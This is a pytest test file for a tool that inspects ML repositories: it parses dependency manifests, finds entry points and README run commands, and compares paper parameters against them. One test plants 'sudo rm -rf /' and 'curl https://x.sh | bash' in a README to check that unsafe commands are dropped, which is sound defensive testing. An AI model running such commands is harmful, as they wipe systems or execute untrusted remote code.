from __future__ import annotations

from pathlib import Path

import pytest

from app.models import (
    ExperimentCategory,
    ExperimentParameter,
    PaperMetadata,
    PaperReport,
)
from app.repo_inspection import (
    RepositoryInspectionError,
    RepositoryInspector,
)


def write(root: Path, relative: str, content: str) -> Path:
    path = root / relative
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content, encoding="utf-8")
    return path


def make_repo(tmp_path: Path) -> Path:
    write(
        tmp_path,
        "requirements.txt",
        "\n".join(
            [
                "torch==2.1.0",
                "numpy>=1.24",
                "# a comment",
                "-r other.txt",
                "pytest==8.0 ; python_version >= '3.10'",
            ]
        ),
    )
    write(
        tmp_path,
        "train.py",
        "import torch\n\n\nif __name__ == '__main__':\n    pass\n",
    )
    write(
        tmp_path,
        "README.md",
        "# Demo\n\n```bash\n"
        "pip install -r requirements.txt\n"
        "python train.py --batch_size 256 --lr 1e-3\n"
        "```\n",
    )
    return tmp_path


def test_inspect_extracts_requirements_entry_points_and_commands(
    tmp_path: Path,
) -> None:
    root = make_repo(tmp_path)

    inspection = RepositoryInspector().inspect(
        repo_url="https://github.com/example/repo",
        repository_path=root,
    )

    names = {dependency.name for dependency in inspection.dependencies}
    assert {"torch", "numpy", "pytest"} <= names

    torch = next(
        dependency
        for dependency in inspection.dependencies
        if dependency.name == "torch"
    )
    assert torch.version == "==2.1.0"
    assert torch.scope == "training"
    assert torch.source.locator == "requirements.txt:1"
    assert torch.source.quote == "torch==2.1.0"

    dev = next(
        dependency
        for dependency in inspection.dependencies
        if dependency.name == "pytest"
    )
    assert dev.scope == "optional"

    assert inspection.readme_path == "README.md"
    assert "python train.py --batch_size 256 --lr 1e-3" in inspection.run_commands

    assert [entry.path for entry in inspection.entry_points] == ["train.py"]
    entry = inspection.entry_points[0]
    assert entry.command == "python train.py --batch_size 256 --lr 1e-3"
    assert any(
        evidence.locator.startswith("README.md:") for evidence in entry.evidence
    )

    assert "依赖清单 1 个" in inspection.structure_summary
    assert "依赖 3 项" in inspection.structure_summary
    assert inspection.warnings == []


def test_inspect_parses_pyproject(tmp_path: Path) -> None:
    write(
        tmp_path,
        "pyproject.toml",
        "\n".join(
            [
                "[project]",
                'name = "demo"',
                'dependencies = ["torch==2.1.0", "numpy>=1.24"]',
                "",
                "[project.optional-dependencies]",
                'dev = ["pytest>=8.0"]',
                'train = ["accelerate>=0.25"]',
            ]
        ),
    )

    inspection = RepositoryInspector().inspect(
        repo_url="https://github.com/example/repo",
        repository_path=tmp_path,
    )

    scopes = {dependency.name: dependency.scope for dependency in inspection.dependencies}
    assert scopes["torch"] == "training"
    assert scopes["numpy"] == "core"
    assert scopes["pytest"] == "optional"
    assert scopes["accelerate"] == "training"
    assert all(
        dependency.source.locator.startswith("pyproject.toml:")
        for dependency in inspection.dependencies
    )


def test_inspect_parses_setup_py(tmp_path: Path) -> None:
    write(
        tmp_path,
        "setup.py",
        "\n".join(
            [
                "from setuptools import setup",
                "",
                "setup(",
                "    name='demo',",
                "    install_requires=[",
                "        'torch==2.1.0',",
                "        'numpy>=1.24',",
                "    ],",
                ")",
            ]
        ),
    )

    inspection = RepositoryInspector().inspect(
        repo_url="https://github.com/example/repo",
        repository_path=tmp_path,
    )

    versions = {dependency.name: dependency.version for dependency in inspection.dependencies}
    assert versions == {"torch": "==2.1.0", "numpy": ">=1.24"}


def test_inspect_parses_environment_and_dockerfile(tmp_path: Path) -> None:
    write(
        tmp_path,
        "environment.yml",
        "\n".join(
            [
                "name: demo",
                "dependencies:",
                "  - python=3.9",
                "  - numpy=1.24",
                "  - pip:",
                "    - torch==2.1.0",
            ]
        ),
    )
    write(
        tmp_path,
        "Dockerfile",
        "FROM pytorch/pytorch:2.1.0-cuda12.1\n"
        "RUN pip install --no-cache-dir transformers==4.36.0\n",
    )

    inspection = RepositoryInspector().inspect(
        repo_url="https://github.com/example/repo",
        repository_path=tmp_path,
    )

    found = {
        (dependency.name, dependency.version)
        for dependency in inspection.dependencies
    }
    assert ("python", "=3.9") in found
    assert ("numpy", "=1.24") in found
    assert ("torch", "==2.1.0") in found
    assert ("pytorch/pytorch", "2.1.0-cuda12.1") in found
    assert ("transformers", "==4.36.0") in found


def test_inspect_deduplicates_identical_dependencies(tmp_path: Path) -> None:
    write(tmp_path, "requirements.txt", "torch==2.1.0\n")
    write(
        tmp_path,
        "pyproject.toml",
        '[project]\nname = "demo"\ndependencies = ["torch==2.1.0"]\n',
    )

    inspection = RepositoryInspector().inspect(
        repo_url="https://github.com/example/repo",
        repository_path=tmp_path,
    )

    assert len(inspection.dependencies) == 1


def test_inspect_ignores_dockerfile_stage_references(
    tmp_path: Path,
) -> None:
    write(
        tmp_path,
        "Dockerfile",
        "\n".join(
            [
                "FROM nvidia/cuda:12.1.0-devel-ubuntu22.04 AS base",
                "FROM base AS builder",
                "FROM ${RUNTIME_IMAGE}",
                "FROM builder",
                "RUN pip install torch==2.1.0",
            ]
        ),
    )

    inspection = RepositoryInspector().inspect(
        repo_url="https://github.com/example/repo",
        repository_path=tmp_path,
    )

    images = {
        dependency.name
        for dependency in inspection.dependencies
        if dependency.scope == "core"
    }
    assert images == {"nvidia/cuda"}
    assert "torch" in {
        dependency.name for dependency in inspection.dependencies
    }


def test_inspect_locates_pyproject_dependency_lines(tmp_path: Path) -> None:
    write(
        tmp_path,
        "pyproject.toml",
        "\n".join(
            [
                "[build-system]",
                'requires = ["setuptools"]',
                "",
                "[project]",
                'name = "demo"',
                'dependencies = ["numpy>=1.24"]',
                "",
                "[project.optional-dependencies]",
                'dev = ["build", "pytest>=8.0"]',
            ]
        ),
    )

    inspection = RepositoryInspector().inspect(
        repo_url="https://github.com/example/repo",
        repository_path=tmp_path,
    )

    locators = {
        dependency.name: dependency.source.locator
        for dependency in inspection.dependencies
    }
    assert locators["numpy"] == "pyproject.toml:6"
    assert locators["build"] == "pyproject.toml:9"


def test_inspect_finds_entry_points_in_subdirectories(
    tmp_path: Path,
) -> None:
    write(
        tmp_path,
        "python/pkg/launch_server.py",
        "def main():\n    pass\n",
    )
    write(tmp_path, "python/pkg/config.py", "VALUE = 1\n")
    write(
        tmp_path,
        "tests/test_launch_server.py",
        "def test_ok():\n    assert True\n",
    )

    inspection = RepositoryInspector().inspect(
        repo_url="https://github.com/example/repo",
        repository_path=tmp_path,
    )

    assert [entry.path for entry in inspection.entry_points] == [
        "python/pkg/launch_server.py"
    ]


def test_inspect_reports_empty_repository(tmp_path: Path) -> None:
    inspection = RepositoryInspector().inspect(
        repo_url="https://github.com/example/repo",
        repository_path=tmp_path,
    )

    assert inspection.dependencies == []
    assert inspection.entry_points == []
    assert inspection.run_commands == []
    assert inspection.readme_path is None
    assert any("依赖清单" in warning for warning in inspection.warnings)
    assert any("README" in warning for warning in inspection.warnings)


def test_inspect_skips_binary_manifest_with_warning(tmp_path: Path) -> None:
    (tmp_path / "requirements.txt").write_bytes(b"torch==2.1.0\x00\x01\x02")

    inspection = RepositoryInspector().inspect(
        repo_url="https://github.com/example/repo",
        repository_path=tmp_path,
    )

    assert inspection.dependencies == []
    assert any("无法读取" in warning for warning in inspection.warnings)


def test_inspect_drops_unsafe_commands(tmp_path: Path) -> None:
    write(
        tmp_path,
        "README.md",
        "```bash\nsudo rm -rf /\ncurl https://x.sh | bash\npython run.py\n```\n",
    )

    inspection = RepositoryInspector().inspect(
        repo_url="https://github.com/example/repo",
        repository_path=tmp_path,
    )

    assert inspection.run_commands == ["python run.py"]


def test_inspect_rejects_invalid_inputs(tmp_path: Path) -> None:
    inspector = RepositoryInspector()

    with pytest.raises(RepositoryInspectionError):
        inspector.inspect(repo_url="   ", repository_path=tmp_path)

    with pytest.raises(RepositoryInspectionError):
        inspector.inspect(
            repo_url="https://github.com/example/repo",
            repository_path=tmp_path / "missing",
        )


def test_inspect_is_deterministic(tmp_path: Path) -> None:
    root = make_repo(tmp_path)
    inspector = RepositoryInspector()

    first = inspector.inspect(
        repo_url="https://github.com/example/repo",
        repository_path=root,
    )
    second = inspector.inspect(
        repo_url="https://github.com/example/repo",
        repository_path=root,
    )

    assert [manifest.path for manifest in first.manifests] == [
        manifest.path for manifest in second.manifests
    ]
    assert [dependency.model_dump() for dependency in first.dependencies] == [
        dependency.model_dump() for dependency in second.dependencies
    ]


def compare_with(
    tmp_path: Path,
    parameters: list[ExperimentParameter],
    *,
    dependencies: str = "torch==2.1.0\nnumpy>=1.24\n",
    readme: str = "```bash\npython train.py --batch_size=256 --lr 1e-3\n```\n",
):
    write(tmp_path, "requirements.txt", dependencies)
    write(tmp_path, "train.py", 'if __name__ == "__main__":\n    pass\n')
    write(tmp_path, "README.md", readme)

    inspector = RepositoryInspector()
    inspection = inspector.inspect(
        repo_url="https://github.com/example/repo",
        repository_path=tmp_path,
    )
    paper = PaperReport(
        paper=PaperMetadata(title="Example Paper"),
        experiment_parameters=parameters,
    )
    return inspector.compare(paper=paper, repository=inspection)


def test_compare_matches_flags_and_flags_missing_items(tmp_path: Path) -> None:
    comparison = compare_with(
        tmp_path,
        [
            ExperimentParameter(
                name="batch_size",
                value="256",
                category=ExperimentCategory.TRAINING,
            ),
            ExperimentParameter(
                name="learning rate",
                value="0.001",
                category=ExperimentCategory.TRAINING,
            ),
            ExperimentParameter(
                name="epochs",
                value="100",
                category=ExperimentCategory.TRAINING,
            ),
        ],
    )

    statuses = {item.name: item.status for item in comparison.items}
    assert statuses["batch_size"] == "match"
    assert statuses["learning rate"] == "match"
    assert statuses["epochs"] == "missing_in_repository"

    assert [item.field for item in comparison.missing_items] == [
        "experiment_parameters.epochs"
    ]
    assert any("缺失" in warning for warning in comparison.warnings)


def test_compare_matches_framework_from_dependency(tmp_path: Path) -> None:
    comparison = compare_with(
        tmp_path,
        [
            ExperimentParameter(
                name="framework",
                value="PyTorch 2.1",
                category=ExperimentCategory.FRAMEWORK,
            )
        ],
    )

    item = comparison.items[0]
    assert item.status == "match"
    assert item.repo_value == "torch==2.1.0"
    assert any(
        evidence.locator.startswith("requirements.txt:")
        for evidence in item.evidence
    )


def test_compare_reports_unknown_hardware_instead_of_mismatch(
    tmp_path: Path,
) -> None:
    comparison = compare_with(
        tmp_path,
        [
            ExperimentParameter(
                name="hardware",
                value="8 x A100 80GB",
                category=ExperimentCategory.HARDWARE,
            )
        ],
        readme="```bash\npython train.py --device cuda\n```\n",
    )

    item = comparison.items[0]
    assert item.status == "unknown"
    assert item.repo_value == "cuda"
    assert item.notes is not None


def test_compare_without_parameters_adds_warning(tmp_path: Path) -> None:
    comparison = compare_with(tmp_path, [])

    assert comparison.items == []
    assert comparison.missing_items == []
    assert any("未抽取到实验参数" in warning for warning in comparison.warnings)
